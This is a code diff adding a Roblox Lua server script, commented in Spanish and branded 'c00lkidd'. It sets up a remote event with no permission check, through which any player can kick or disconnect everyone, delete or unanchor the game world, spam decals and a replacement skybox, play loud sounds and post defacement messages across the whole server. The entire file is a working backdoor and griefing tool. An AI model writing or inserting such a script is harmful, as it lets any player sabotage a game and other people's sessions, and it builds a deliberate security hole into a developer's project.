@@ -1,0 +1,136 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Lighting = game:GetService("Lighting")
+
+-- Crear RemoteEvent
+local remoteEvent = Instance.new("RemoteEvent")
+remoteEvent.Name = "c00lkiddRemote"
+remoteEvent.Parent = ReplicatedStorage
+
+local CUSTOM_IMAGE_ID = "rbxassetid://122516441342599"
+
+-- Función para detener sonidos
+local function stopAllSounds()
+	for _, obj in pairs(workspace:GetChildren()) do
+		if obj:IsA("Sound") then
+			obj:Stop()
+			obj:Destroy()
+		end
+	end
+end
+
+-- MANEJAR COMANDOS (AFECTAN A TODO EL SERVIDOR)
+remoteEvent.OnServerEvent:Connect(function(player, action)
+	print(player.Name .. " ejecutó: " .. action)
+
+	if action == "kickAll" then
+		for _, targetPlayer in pairs(Players:GetPlayers()) do
+			if targetPlayer ~= player then
+				targetPlayer:Kick("Kicked by " .. player.Name)
+			end
+		end
+
+	elseif action == "shutdown" then
+		for _, targetPlayer in pairs(Players:GetPlayers()) do
+			targetPlayer:Kick("Server shutdown")
+		end
+
+	elseif action == "disco" then
+		spawn(function()
+			for i = 1, 50 do
+				Lighting.Ambient = Color3.fromHSV(math.random(), 1, 1)
+				wait(0.1)
+			end
+			Lighting.Ambient = Color3.fromRGB(138, 138, 138)
+		end)
+
+	elseif action == "rainTacos" then
+		stopAllSounds()
+		local sound = Instance.new("Sound")
+		sound.SoundId = "rbxassetid://142376088"
+		sound.Volume = 0.8
+		sound.Looped = true
+		sound.Parent = workspace
+		sound:Play()
+
+	elseif action == "stopMusic" then
+		stopAllSounds()
+
+	elseif action == "decalspam" then
+		for i = 1, 15 do
+			local part = Instance.new("Part")
+			part.Size = Vector3.new(10, 10, 1)
+			part.Position = Vector3.new(math.random(-50, 50), 10, math.random(-50, 50))
+			part.Anchored = true
+			part.Parent = workspace
+
+			for _, face in pairs(Enum.NormalId:GetEnumItems()) do
+				local decal = Instance.new("Decal")
+				decal.Texture = CUSTOM_IMAGE_ID
+				decal.Face = face
+				decal.Parent = part
+			end
+		end
+
+	elseif action == "skybox" then
+		local sky = Instance.new("Sky")
+		sky.SkyboxBk = CUSTOM_IMAGE_ID
+		sky.SkyboxDn = CUSTOM_IMAGE_ID
+		sky.SkyboxFt = CUSTOM_IMAGE_ID
+		sky.SkyboxLf = CUSTOM_IMAGE_ID
+		sky.SkyboxRt = CUSTOM_IMAGE_ID
+		sky.SkyboxUp = CUSTOM_IMAGE_ID
+		sky.Parent = Lighting
+
+	elseif action == "hint" then
+		local hint = Instance.new("Hint")
+		hint.Text = "c00lkidd was here!"
+		hint.Parent = workspace
+		game:GetService("Debris"):AddItem(hint, 5)
+
+	elseif action == "message" then
+		local message = Instance.new("Message")
+		message.Text = "Server has been c00lkidd'd!"
+		message.Parent = workspace
+		game:GetService("Debris"):AddItem(message, 5)
+
+	elseif action == "unanchorAll" then
+		for _, obj in pairs(workspace:GetDescendants()) do
+			if obj:IsA("BasePart") then
+				obj.Anchored = false
+			end
+		end
+
+	elseif action == "clearWorkspace" then
+		for _, obj in pairs(workspace:GetChildren()) do
+			if obj ~= workspace.CurrentCamera and not Players:GetPlayerFromCharacter(obj) then
+				obj:Destroy()
+			end
+		end
+
+	elseif action == "imageFlood" then
+		for _, obj in pairs(workspace:GetDescendants()) do
+			if obj:IsA("BasePart") and obj.Name ~= "HumanoidRootPart" then
+				for _, face in pairs(Enum.NormalId:GetEnumItems()) do
+					local decal = Instance.new("Decal")
+					decal.Texture = CUSTOM_IMAGE_ID
+					decal.Face = face
+					decal.Parent = obj
+				end
+			end
+		end
+
+	elseif action == "effect666" then
+		Lighting.Ambient = Color3.fromRGB(255, 0, 0)
+		Lighting.Brightness = 0
+
+		stopAllSounds()
+		local sound = Instance.new("Sound")
+		sound.SoundId = "rbxassetid://131961136"
+		sound.Volume = 1
+		sound.Parent = workspace
+		sound:Play()
+	end
+end)
+
+print("Servidor c00lkidd cargado - Funciones afectan a todos los jugadores")
